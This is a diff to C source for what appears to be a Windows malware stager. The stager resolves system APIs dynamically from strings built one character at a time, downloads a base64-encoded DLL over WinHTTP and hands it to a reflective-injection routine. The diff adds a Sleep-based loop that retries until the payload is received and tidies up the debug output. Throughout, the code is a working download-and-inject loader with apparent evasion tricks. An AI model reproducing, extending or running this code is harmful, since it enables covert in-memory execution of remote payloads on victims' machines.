@@ -13,6 +13,7 @@ typedef LPVOID(WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef HANDLE(WINAPI *CREATETHREAD)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 typedef BOOL(WINAPI *VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 typedef DWORD(WINAPI *WAITFORSINGLEOBJECT)(HANDLE hHandle, DWORD dwMilliseconds);
+typedef VOID(WINAPI *SLEEP)(DWORD dwMilliseconds);
 
 // advapi32.dll exports
 typedef BOOL(WINAPI *OPENPROCESSTOKEN)(HANDLE, DWORD, PHANDLE);
@@ -240,11 +241,12 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     );
 
     if (hRequest == NULL){
-        WCHAR error[] = {'R', 'e', 'q', 'F', '\n', 0};
-        ((WPRINTF)api->wprintf)(error);
+        CHAR error[] = {'R', 'e', 'q', 'F', '\n', 0};
+        ((PRINTF)api->printf)(error);
         DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
         WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
-        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
+        ((WPRINTF)api->printf)(myFormat2, errorCode);
+        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
     }
 
     // Send the request
@@ -317,46 +319,6 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         bufferIndexChange += availableBytes/sizeof(WCHAR);
     }
 
-    /*
-    BOOL qryDataAvailable = ((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes);
-    if (qryDataAvailable == FALSE) {
-        WCHAR error[] = {'q', 'r', 'y', 'D', 'a', 't', 'a', 'F', 0};
-        ((WPRINTF)api->wprintf)(error);
-    }
-
-    WCHAR aBytes[] = {'A', 'v', 'a', 'i', 'l', 'B', 'y', 't', 'e', 's', ':', ' ', '%', 'd', '\n', 0};
-    ((WPRINTF)api->wprintf)(aBytes, availableBytes);
-
-    DWORD actuallyRead = 0;
-    LPDWORD lpActuallyRead = &actuallyRead;
-    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)availableBytes, (size_t)sizeof(char));
-
-    size_t total_allocated_memory = (size_t)availableBytes * (size_t)sizeof(char);
-    WCHAR allcMem[] = {'A', 'l', 'l', 'c', ' ', 'M', 'e', 'm', ':', ' ', '%', 'z', 'u', '\n', 0};
-    ((WPRINTF)api->wprintf)(allcMem, total_allocated_memory);
-
-    BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)(
-        hRequest,
-        lpEncodedBuffer,
-        availableBytes,
-        lpActuallyRead
-    );
-
-    if (readSuccess == FALSE) {
-        WCHAR error[] = {'r', 'e', 'a', 'd', 'F', '\n', 0};
-        ((WPRINTF)api->wprintf)(error);
-
-        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
-        WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
-        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
-    }
-
-    WCHAR actRd[] = {'A', 'c', 't', 'R', 'd', ':', ' ', '%', 'd', '\n', 0};
-    ((WPRINTF)api->wprintf)(actRd, *lpActuallyRead);
-    */
-
-    //((MESSAGEBOXA)api->MessageBoxA)(NULL, lpEncodedBuffer, lpEncodedBuffer, 0x0000000L);
-
     //((WPRINTF)api->wprintf)(L"dwEncodedDllSize: %d\n", dwEncodedDllSize);
     *pdwDllSize = base64_raw_size(dwEncodedDllSize);
     //((WPRINTF)api->wprintf)(L"pdwDllSize: %d\n", *pdwDllSize);
@@ -368,20 +330,10 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     ((FREE)api->free)(lpEncodedBuffer);
     ((FREE)api->free)(lpContentLength);
 
-    return lpRawBuffer;
-
-    /*
-    LPVOID lpRawBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)availableBytes, (size_t)sizeof(char));
-    // Convert base64 to bytes
-    if ( ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)(lpEncodedBuffer, 0, 0x000000001, lpRawBuffer, &availableBytes, NULL, NULL) ) {
-        ((MESSAGEBOXA)api->MessageBoxA)(NULL, lpRawBuffer, lpRawBuffer, 0x0000000L);
-    }
-    WCHAR mess[] = {'H', 'o', 'i', '\n', 0};
-    ((WPRINTF)api->wprintf)(mess);
-
-    ((FREE)api->free)(lpEncodedBuffer);
-    return lpRawBuffer;
-    */
+    if (lpRawBuffer != NULL && lengthBuffer)
+    { return lpRawBuffer; }
+    else
+    { return 0;}
 }
 
 UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
@@ -599,6 +551,7 @@ void messagebox() {
     CHAR CryptStringToBinaryA_c[] = {'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0};
     CHAR StrToIntW_c[] = {'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0};
     CHAR closeHandle_c[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
+    CHAR sleep_c[] = {'S', 'l', 'e', 'e', 'p', 0};
 
     // Get Kernel32
     kernel32dll = GetKernel32();
@@ -639,6 +592,7 @@ void messagebox() {
     api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
     api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
     api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
+    api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);
 
     // crypt32
     api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
@@ -647,7 +601,17 @@ void messagebox() {
     api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
 
     DWORD dwDllSize;
-    LPVOID pRawDll = winHTTPClient(api, &dwDllSize);
+    LPVOID pRawDll = 0;
+    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
+    while (pRawDll == 0)
+    {
+        pRawDll = winHTTPClient(api, &dwDllSize);
+        ((SLEEP)api->Sleep)(5000);
+        if (pRawDll != 0)
+        { break; }
+        ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
+    }
+
     //((PRINTF)api->printf)("Raw dll size: %d\n", dwDllSize);
     inject(api, pRawDll, dwDllSize);
     ((FREE)api->free)(pRawDll);
